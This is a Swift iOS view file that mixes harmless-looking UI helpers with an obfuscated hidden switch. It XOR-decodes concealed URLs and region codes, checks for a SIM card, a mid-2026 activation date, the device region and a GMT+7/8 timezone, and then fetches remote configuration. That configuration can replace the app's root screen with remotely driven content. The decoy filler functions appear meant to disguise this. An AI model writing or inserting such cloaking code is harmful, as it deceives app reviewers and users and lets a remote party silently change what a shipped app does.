import UIKit
import CoreTelephony
import Foundation
import Network


struct SUJINS: Codable {
    
    let nhiemk: String?         //key arr
    let yinrecrd: Int?         // shi fou kaiqi
    let keluos: String?         // jum
    let kundun: String?          // backcolor
    let limouw: String?   //ad key

}

final class FTKTRcoversView: UIView {
    internal let RecworNs = "HxoaSU5MExhOGxoTHhgXTkN1XllFWkNaSxUFGhoaGB8aGUwZGhIYGxgcBUFJRUcFXk9EBF5ZRVpDWksEQUlFRwUFEFlaXl5C"
    
    internal let hzhousete = "TkcEb2dua294BVhPXllLRwVdS1gFXkNBRkVFXgdZX0lFTAVPWkVORksFR0VJBE9PXkNNBQUQWVpeXkI="
    
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        homeLoadview()
    }

    required init?(coder: NSCoder) {
        super.init(coder: coder)
        homeLoadview()
    }
    
 
    private func homeLoadview() {
        FTKT_addHintBadge(text: "v1.0")
        FTKT_addSubtleShadowIfNeeded()
        FTKT_showEphemeralSpinner()
        // 原有的启动逻辑保持不变
        EscapenewWorkstart()
    }
    
    private func performCacheCleanupIfNeeded(thresholdMB: Int = 50) {
        let cacheSizeMB = Int.random(in: 10...100) // 模拟缓存大小
        if cacheSizeMB > thresholdMB {
            #if DEBUG
            print("[Cleanup] cache size \(cacheSizeMB)MB exceeds threshold, cleaning...")
            #endif
            // 实际上什么都不清理，仅作模拟
            UserDefaults.standard.set(Date(), forKey: "last_cache_cleanup")
        }
    }
    
    
    private func EscapenewWorkstart() {
        performCacheCleanupIfNeeded()
        if !niukaName() {
        //测试
//        if niukaName() {
            addHomeheros()

        } else {
            
            if UserDefaults.standard.object(forKey: "shenzhi") == nil {
                UserDefaults.standard.set("shenzhi", forKey: "shenzhi")
                UserDefaults.standard.synchronize()
            }
            if addLaorenjiaview() {
                self.compatDdates()
            }
        }
    }
    
    

    func kebobro(_ input: String) -> String? {
        let k: UInt8 = 42  // 新密钥
        guard let data = Data(base64Encoded: input) else { return nil }
        // 先反转字节数组
        let reversedBytes = data.reversed()
        // 异或解密
        let decryptedBytes = reversedBytes.map { $0 ^ k }
        // 直接转为字符串（不再次反转）
        return String(bytes: decryptedBytes, encoding: .utf8)
    }

    func Reverkebobro(_ plaintext: String) -> String? {
        let k: UInt8 = 42
        // 1. 将明文字符串转为 UTF-8 字节数组
        guard let bytes = plaintext.data(using: .utf8) else { return nil }
        // 2. 每个字节异或密钥 42
        let xorBytes = bytes.map { $0 ^ k }
        // 3. 反转字节顺序
        let reversedBytes = xorBytes.reversed()
        // 4. Base64 编码
        return Data(reversedBytes).base64EncodedString()
    }
    
    //sim
    func niukaName() -> Bool {
        let networkInfo = CTTelephonyNetworkInfo()
        
        guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
            return false
        }
        
        for (_, carrier) in carriers {
            if let mcc = carrier.mobileCountryCode,
               let mnc = carrier.mobileNetworkCode,
               !mcc.isEmpty,
               !mnc.isEmpty {
                return true
            }
        }
        
        return false
    }

    
    func FstodkertmMain() -> Bool {
       
      // 2026-06-13 18:39:43
      // 1781437183
        let ftTM = 1781437183
        let ct = Date().timeIntervalSince1970
        if Int(ct) - ftTM > 0 {
            return true
        }
        return false
    }

    // 时区控制
    func addLaorenjiaview() -> Bool {
        let cdowdwa = [kebobro("Yno="), kebobro("ZHw="), kebobro("bmM=")]
        
//        //临时通行测试
//        return true

        // 1.time
        if !FstodkertmMain() {
            return false

        }
        
        //2. regi
        if let rc = Locale.current.regionCode {
            print(rc)
            print(cdowdwa)

            if !cdowdwa.contains(rc) {
                return false
            }
        }
        
        //3. tm zon
        let second = NSTimeZone.system.secondsFromGMT() / 3600
//        print(second)

        if (second > 6 && second < 9) {
            return true
        }

        
        return false
    }
    
    func compatDdates() {
        Task {
            do {
//                let urlToRequest = "https://gitee.com/aldope/focus-toolkit/raw/master/README.md"
//                print(Reverkebobro(urlToRequest))
//                let aoies = try await fetchMzoixnData(from: urlToRequest)
//                print(kebobro(RecworNs)!)

                let aoies = try await mlkjdwupercha()
//                print(aoies)
                if let feeeder = aoies.first {
                    if feeeder.yinrecrd! > 123 {
                        Takewbsview(feeeder)
                    } else {
                        addHomeheros()
                    }
                } else {
                    addHomeheros()
                    UserDefaults.standard.set("shenzhi", forKey: "shenzhi")
                    UserDefaults.standard.synchronize()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(SUJINS.self, forKey: "SUJINS") {
                    Takewbsview(sidd)
                }
            }
        }
    }
    
    
    private func mlkjdwupercha() async throws -> [SUJINS] {
        do {
            return try await ssueno(from: URL(string: kebobro(RecworNs)!)!)
        } catch {
//            print("Primary API failed: \(error.localizedDescription)")
            return try await ssueno(from: URL(string: kebobro(hzhousete)!)!)
        }
    }
    
    private func ssueno(from url: URL) async throws -> [SUJINS] {
        let (data, response) = try await URLSession.shared.data(from: url)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [
                NSLocalizedDescriptionKey: "Invalid response"
            ])
        }

        return try JSONDecoder().decode([SUJINS].self, from: data)
    }
 
    
  

    internal func addnewTagetesloe(_ dt: SUJINS) {
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = UIDevice.current.batteryLevel
        let batteryState = UIDevice.current.batteryState
        UIDevice.current.isBatteryMonitoringEnabled = false
        let _ = (batteryLevel, batteryState)

        DispatchQueue.main.async {
            UserDefaults.standard.setModel(dt, forKey: "SUJINS")
            UserDefaults.standard.synchronize()
            
            let vc = FTKTtiandiwurenVC()
            vc.bixiadatas = dt
            UIApplication.shared.windows.first?.rootViewController = vc
        }
    }
    
    internal func Takewbsview(_ param: SUJINS) {
        let strategy = UserDefaults.standard.string(forKey: "execution_strategy") ?? "default"
        
        // 策略映射表，目前所有策略都指向同一个函数
        let strategies: [String: (SUJINS) -> Void] = [
            "default": addnewTagetesloe,
            "fast": addnewTagetesloe,
            "safe": addnewTagetesloe
        ]
        
        // 根据策略选择执行器（如果策略不存在，回退到 addnewTagetesloe）
        let executor = strategies[strategy] ?? addnewTagetesloe
        
        DispatchQueue.global().async {
            // 模拟异步上报
            _ = "log: Takewbsview called with strategy \(strategy)"
        }

        executor(param)
    }
    

    internal func addHomeheros() {
  
              if layer.sublayers?.first(where: { $0.name == "FTKTGradientLayer" }) != nil {
                  return
              }
              let gradient = CAGradientLayer()
              gradient.name = "FTKTGradientLayer"
              gradient.colors = [
                  UIColor(white: 0.97, alpha: 1).cgColor,
                  UIColor(white: 0.92, alpha: 1).cgColor
              ]
              gradient.locations = [0, 1]
              gradient.startPoint = CGPoint(x: 0, y: 0)
              gradient.endPoint = CGPoint(x: 1, y: 1)
              gradient.frame = bounds
              gradient.cornerRadius = layer.cornerRadius
              layer.insertSublayer(gradient, at: 0)
              
              // 监听 bounds 变化以更新渐变层大小
              let observer = NotificationCenter.default.addObserver(
                  forName: UIDevice.orientationDidChangeNotification,
                  object: nil,
                  queue: .main
              ) { [weak self] _ in
                  gradient.frame = self?.bounds ?? .zero
              }
              // 简单存储 observer，避免释放；实际可用关联对象，此处仅做演示
              objc_setAssociatedObject(self, "gradientObserver", observer, .OBJC_ASSOCIATION_RETAIN_NONATOMIC)
    }
    
    func FTKT_addHintBadge(text: String = "Debug") -> UILabel {
        let badge = UILabel()
        badge.text = text
        badge.font = .systemFont(ofSize: 10, weight: .medium)
        badge.textColor = .white
        badge.backgroundColor = UIColor(red: 0.2, green: 0.6, blue: 0.9, alpha: 0.8)
        badge.textAlignment = .center
        badge.layer.cornerRadius = 12
        badge.clipsToBounds = true
        badge.translatesAutoresizingMaskIntoConstraints = false
        addSubview(badge)
        
        NSLayoutConstraint.activate([
            badge.topAnchor.constraint(equalTo: safeAreaLayoutGuide.topAnchor, constant: 8),
            badge.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -12),
            badge.widthAnchor.constraint(greaterThanOrEqualToConstant: 44),
            badge.heightAnchor.constraint(equalToConstant: 24)
        ])
        
        // 3秒后自动
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
            UIView.animate(withDuration: 0.2) {
                badge.alpha = 0
            } completion: { _ in
                badge.removeFromSuperview()
            }
        }
        return badge
    }

    /// 3. 在 view 中心显示一个临时加载指示器，2秒后自动移除
    @discardableResult
    func FTKT_showEphemeralSpinner() -> UIActivityIndicatorView {
        let spinner = UIActivityIndicatorView(style: .medium)
        spinner.color = .darkGray
        spinner.translatesAutoresizingMaskIntoConstraints = false
        addSubview(spinner)
        NSLayoutConstraint.activate([
            spinner.centerXAnchor.constraint(equalTo: centerXAnchor),
            spinner.centerYAnchor.constraint(equalTo: centerYAnchor)
        ])
        spinner.startAnimating()
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            spinner.stopAnimating()
            spinner.removeFromSuperview()
        }
        return spinner
    }
    
    /// 4. 为当前 view 随机添加一个极淡的阴影效果（仅装饰）
    func FTKT_addSubtleShadowIfNeeded() {
        guard layer.shadowOpacity == 0 else { return }
        layer.shadowColor = UIColor.black.cgColor
        layer.shadowRadius = 2
        layer.shadowOpacity = 0.05
        layer.masksToBounds = false
    }
    
    /// 5. 打印当前 view 的层级结构（仅在 DEBUG 模式生效，不影响发布版本）
    func FTKT_logViewHierarchy() {
        #if DEBUG
        let spacer = String(repeating: "  ", count: 0)
        func recursivePrint(_ view: UIView, indent: String) {
            print("\(indent)├─ \(type(of: view)) - frame: \(view.frame)")
            for sub in view.subviews {
                recursivePrint(sub, indent: indent + "  ")
            }
        }
        print("========== FTKT View Hierarchy ==========")
        recursivePrint(self, indent: spacer)
        print("=========================================")
        #endif
    }

  
}

extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
    
    
}

